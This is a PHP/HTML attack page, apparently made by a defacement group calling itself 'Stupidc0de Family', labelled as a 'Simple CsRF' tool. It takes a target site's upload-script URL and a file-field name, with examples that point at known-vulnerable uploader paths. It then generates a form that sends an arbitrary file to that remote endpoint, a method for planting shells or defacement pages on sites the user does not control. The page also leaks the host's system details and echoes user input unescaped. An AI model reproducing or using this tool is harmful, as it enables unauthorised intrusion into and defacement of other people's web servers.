<html>
	<title>[!] Sc0 Simple CsRF [!]</title>
	<style>
	</style>
	</head>
<body><center>
	<div id="spoiler">
<div><input style="background-color: black; font-size: 30px; color: white; margin: 5px; padding: 0px;" onclick="if (this.parentNode.parentNode.getElementsByTagName('div')['show'].style.display != '') { this.parentNode.parentNode.getElementsByTagName('div')['show'].style.display = ''; this.parentNode.parentNode.getElementsByTagName('div')['hide'].style.display = 'none'; this.innerText = ''; this.value = 'Sembunyikan'; } else { this.parentNode.parentNode.getElementsByTagName('div')['show'].style.display = 'none'; this.parentNode.parentNode.getElementsByTagName('div')['hide'].style.display = ''; this.innerText = ''; this.value = 'Tampilkan'; }" name="button" type="button" value="  >  " /></div>
<div id="show" style="border: px solid white; display: none; margin: 5px; padding: 2px; width: 98%;">
	
	<div class="jw-slideshow">
	<center>
		
<form method="post">
	
<div style="font-family: New Rocker; font-size: 40px;
-webkit-text-stroke: 1px red; color: white;">[!] Stupidc0de Family [!]</div>

<H3>NO LEADER WE JUST LAUGH TOGETHER</H3>
	
	<br>
[<input type="text" name="url" size="50" height="10" placeholder="fullurl ex: https://memekshop/js/webforms/upload/index.php" style="margin: 5px auto; padding-left: 5px;" required>]<br>
[<input type="text" name="pf" size="20" height="10" placeholder="array ex:/files[]/qqfile/" style="margin: 5px auto; padding-left: 5px;" required>]<br>
<input type="submit" name="d" value="LOCK">
</center>
</form>
<script src="//code.jquery.com/jquery-1.10.2.js"></script>
<link href="http://fonts.googleapis.com/css?family=New+Rocker" rel="stylesheet">
	<script src="jquery.backstretch.min.js"></script>
	<script type="text/javascript">
		$.backstretch(
		[
		    "http://dev.slemanboys.org/ita/r.png",
			"http://dev.slemanboys.org/ita/t.png",
			"http://dev.slemanboys.org/ita/267414.jpg",
			
		], 
		{
			duration: 2000, 
			fade: 4000
		});
	</script>
<?php
@ini_set('output_buffering',0); 
@ini_set('display_errors', 0);
$url = $_POST['url'];
$pf = $_POST['pf'];
$d = $_POST['d'];
if($d) {
	echo "<br><center><form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='pencet'></form";
}
?>
</form>
<br><br><br>

</div><div id="hide"></div></div></div>
<center>
	<br><br>
<font size="8" color="white">
SimPle CsRF by Stupidc0de</font></center>
<?php
echo '<b>'.php_uname().'<br></b>';
?>
</body>
</html>
